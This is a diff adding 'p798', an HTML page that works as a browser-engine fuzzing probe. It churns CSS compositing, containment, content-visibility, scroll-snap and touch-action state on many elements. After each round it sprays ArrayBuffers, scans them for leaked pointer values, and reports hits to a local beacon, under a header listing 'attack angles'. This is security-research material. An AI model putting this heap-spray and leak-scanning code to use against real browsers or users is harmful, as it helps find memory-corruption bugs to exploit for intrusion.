@@ -1,0 +1,401 @@
+<!--
+  p798: CSS will-change compositing / CSS containment / content-visibility /
+        CSS scroll-snap / CSS overscroll-behavior / CSS touch-action residue
+
+  CSS will-change: setting will-change on an element promotes it to a
+  compositing layer, allocating C++ RenderLayer and GraphicsLayer
+  objects. Toggling will-change on/off exercises layer create/destroy.
+  The compositing layer tree is a separate allocator from the DOM.
+
+  CSS contain: contain property (strict, content, layout, paint, size,
+  style) creates C++ containment state on RenderBox. Each containment
+  type exercises a different layout optimization path.
+
+  content-visibility: auto/hidden/visible controls whether an element's
+  subtree is rendered. Switching to 'auto' allocates IntersectionObserver-
+  like state. Toggling exercises the C++ ContentVisibilityAutoObserver.
+
+  CSS scroll-snap: scroll-snap-type and scroll-snap-align create C++
+  SnapCoordinator and SnapArea objects. Each snap point allocates
+  position state.
+
+  CSS overscroll-behavior: overscroll-behavior-x/y create C++
+  overscroll state on the scroll container.
+
+  CSS touch-action: touch-action property creates C++ hit-testing
+  state for touch event regions.
+
+  Attack angles:
+  A) will-change compositing layer create/destroy.
+  B) CSS contain property toggling across types.
+  C) content-visibility auto/hidden toggling.
+  D) scroll-snap coordinate allocation.
+  E) CSS grid/flexbox layout churn with containment.
+  F) touch-action region map churn.
+
+  CRASH_CLASS: LOW (CSS properties, layout, no side effects)
+  prior art: p792 (CSS filter), p796 (CSS conditional rules)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p798</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p798-START');
+
+// === Section A: will-change compositing layer create/destroy ===
+try{
+  b('A-willchange');
+  var aHits=0;
+
+  var willChangeProps=['transform','opacity','top','left','scroll-position',
+    'transform, opacity','top, left','transform, opacity, top',
+    'filter','contents'];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:40px;height:40px;background:rgb('+(i*6)+',100,150);display:inline-block;position:relative;';
+        document.body.appendChild(el);
+
+        // Toggle will-change rapidly to create/destroy compositing layers
+        for(var cycle=0;cycle<12;cycle++){
+          el.style.willChange=willChangeProps[cycle%willChangeProps.length];
+          var h=el.offsetHeight; // force layout
+          el.style.willChange='auto';
+          h=el.offsetHeight;
+        }
+
+        if(round===0&&i===0){
+          var cs=getComputedStyle(el);
+          b('A willChange='+cs.willChange);
+        }
+
+        elements.push(el);
+      }
+
+      if(round===0)b('A toggled will-change on '+elements.length+' elements, 12 cycles each across '+willChangeProps.length+' properties');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: CSS contain property toggling ===
+try{
+  b('B-contain');
+  var bHits=0;
+
+  var containValues=['none','strict','content','layout','paint','size',
+    'style','layout paint','layout size','paint size',
+    'layout paint size','layout style','layout paint style size'];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:60px;height:60px;display:inline-block;background:#555;overflow:hidden;';
+
+        // Add child content that containment affects
+        for(var c=0;c<5;c++){
+          var child=document.createElement('span');
+          child.textContent='C'+c+' ';
+          child.style.display='inline-block';
+          child.style.width='20px';
+          child.style.height='20px';
+          child.style.background='rgba(255,0,0,0.3)';
+          el.appendChild(child);
+        }
+
+        document.body.appendChild(el);
+
+        // Toggle contain values
+        for(var cv=0;cv<containValues.length;cv++){
+          el.style.contain=containValues[cv];
+          var h=el.offsetHeight;
+          var w=el.offsetWidth;
+        }
+
+        // Reset
+        el.style.contain='none';
+        var h=el.offsetHeight;
+
+        if(round===0&&i===0){
+          b('B contain='+getComputedStyle(el).contain);
+        }
+
+        elements.push(el);
+      }
+
+      if(round===0)b('B toggled contain on '+elements.length+' elements across '+containValues.length+' values');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: content-visibility auto/hidden toggling ===
+try{
+  b('C-contentvisibility');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      // Create scrollable container
+      var container=document.createElement('div');
+      container.style.cssText='width:300px;height:200px;overflow:auto;';
+      document.body.appendChild(container);
+
+      for(var i=0;i<50;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:100%;min-height:50px;background:hsl('+(i*7)+',60%,70%);margin:2px 0;contain-intrinsic-size:auto 50px;';
+
+        // Rich content
+        for(var c=0;c<3;c++){
+          var p=document.createElement('p');
+          p.textContent='Section '+i+' paragraph '+c+' with text content for layout.';
+          el.appendChild(p);
+        }
+
+        container.appendChild(el);
+
+        // Toggle content-visibility
+        for(var cycle=0;cycle<8;cycle++){
+          el.style.contentVisibility=['visible','hidden','auto','hidden','visible','auto','hidden','visible'][cycle];
+          var h=el.offsetHeight;
+        }
+
+        if(round===0&&i===0){
+          try{
+            b('C contentVisibility='+getComputedStyle(el).contentVisibility);
+          }catch(e){
+            b('C cv_getcomputed_err='+e.message);
+          }
+        }
+
+        elements.push(el);
+      }
+
+      if(round===0)b('C toggled content-visibility on '+elements.length+' elements, 8 cycles each');
+
+      document.body.removeChild(container);
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96,128]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: scroll-snap coordinate allocation ===
+try{
+  b('D-scrollsnap');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var containers=[];
+
+      for(var s=0;s<10;s++){
+        var scrollBox=document.createElement('div');
+        scrollBox.style.cssText='width:200px;height:150px;overflow:auto;scroll-snap-type:'+(['x mandatory','y mandatory','both mandatory','x proximity','y proximity'])[s%5]+';display:inline-block;white-space:nowrap;';
+        document.body.appendChild(scrollBox);
+
+        // Add snap children
+        for(var i=0;i<20;i++){
+          var child=document.createElement('div');
+          child.style.cssText='width:100px;height:100px;display:inline-block;background:hsl('+(i*18)+',70%,60%);scroll-snap-align:'+(['start','center','end','none'])[i%4]+';scroll-snap-stop:'+(['normal','always'])[i%2]+';flex-shrink:0;';
+          child.textContent='Snap '+i;
+          scrollBox.appendChild(child);
+        }
+
+        // Scroll through snap points
+        for(var pos=0;pos<2000;pos+=100){
+          scrollBox.scrollLeft=pos;
+        }
+        scrollBox.scrollLeft=0;
+
+        if(round===0&&s===0){
+          b('D scrollSnap type='+getComputedStyle(scrollBox).scrollSnapType);
+          b('D scrollLeft='+scrollBox.scrollLeft+' children='+scrollBox.children.length);
+        }
+
+        // Toggle scroll-snap-type
+        for(var t=0;t<5;t++){
+          scrollBox.style.scrollSnapType=['none','x mandatory','y proximity','both mandatory','none'][t];
+          scrollBox.scrollLeft=t*50;
+        }
+
+        containers.push(scrollBox);
+      }
+
+      if(round===0)b('D created '+containers.length+' scroll-snap containers with 20 snap children each');
+
+      for(var i=0;i<containers.length;i++){
+        document.body.removeChild(containers[i]);
+      }
+      containers=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Grid/flex layout with containment churn ===
+try{
+  b('E-grid-contain');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var grids=[];
+
+      for(var g=0;g<15;g++){
+        var grid=document.createElement('div');
+        grid.style.cssText='display:grid;grid-template-columns:repeat(4,1fr);gap:2px;width:200px;contain:layout paint;';
+        document.body.appendChild(grid);
+
+        for(var i=0;i<16;i++){
+          var cell=document.createElement('div');
+          cell.style.cssText='background:hsl('+(g*20+i*10)+',60%,60%);padding:4px;contain:style;';
+          cell.textContent='G'+g+'C'+i;
+          grid.appendChild(cell);
+        }
+
+        // Toggle between grid and flex
+        for(var cycle=0;cycle<8;cycle++){
+          if(cycle%2===0){
+            grid.style.display='flex';
+            grid.style.flexWrap='wrap';
+          }else{
+            grid.style.display='grid';
+            grid.style.gridTemplateColumns='repeat('+(2+cycle%3)+',1fr)';
+          }
+          grid.style.contain=['none','strict','content','layout paint'][cycle%4];
+          var h=grid.offsetHeight;
+        }
+
+        grids.push(grid);
+      }
+
+      if(round===0)b('E created '+grids.length+' grid/flex containers with containment churn');
+
+      for(var i=0;i<grids.length;i++){
+        document.body.removeChild(grids[i]);
+      }
+      grids=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[48,64,96,128]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: touch-action region map churn ===
+try{
+  b('F-touchaction');
+  var fHits=0;
+
+  var touchValues=['auto','none','pan-x','pan-y','pan-x pan-y',
+    'pinch-zoom','manipulation','pan-left','pan-right','pan-up','pan-down'];
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var elements=[];
+
+      for(var i=0;i<40;i++){
+        var el=document.createElement('div');
+        el.style.cssText='width:50px;height:50px;display:inline-block;background:rgba(100,200,100,0.5);';
+        document.body.appendChild(el);
+
+        // Rapid touch-action changes
+        for(var cycle=0;cycle<touchValues.length*2;cycle++){
+          el.style.touchAction=touchValues[cycle%touchValues.length];
+          var h=el.offsetHeight;
+        }
+
+        // Also set overscroll-behavior
+        el.style.overscrollBehavior='contain';
+        el.style.overscrollBehaviorX='none';
+        el.style.overscrollBehaviorY='auto';
+        var h=el.offsetHeight;
+
+        if(round===0&&i===0){
+          b('F touchAction='+getComputedStyle(el).touchAction);
+          try{b('F overscrollBehavior='+getComputedStyle(el).overscrollBehavior);}catch(e){}
+        }
+
+        elements.push(el);
+      }
+
+      if(round===0)b('F toggled touch-action on '+elements.length+' elements across '+touchValues.length+' values');
+
+      for(var i=0;i<elements.length;i++){
+        document.body.removeChild(elements[i]);
+      }
+      elements=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p798-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
